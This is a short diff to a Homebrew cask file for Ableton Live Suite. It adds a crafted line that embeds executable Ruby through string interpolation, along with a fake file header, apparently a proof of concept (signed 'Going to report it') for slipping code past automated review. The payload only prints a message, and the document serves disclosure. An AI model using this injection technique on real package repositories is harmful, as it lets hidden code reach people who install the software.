@@ -35,4 +35,6 @@ cask "ableton-live-suite" do
     "~/Documents/Max [0-9]",
     "/Users/Shared/Max [0-9]",
   ]
+  ++ "b/#{puts 'Going to report it - RyotaK (https://hackeorne.com/ryotak)';b = 1;Casks = 1;iterm2 = {};iterm2.define_singleton_method(:rb) do 1 end}"
+++ b/Casks/iterm2.rb
 end
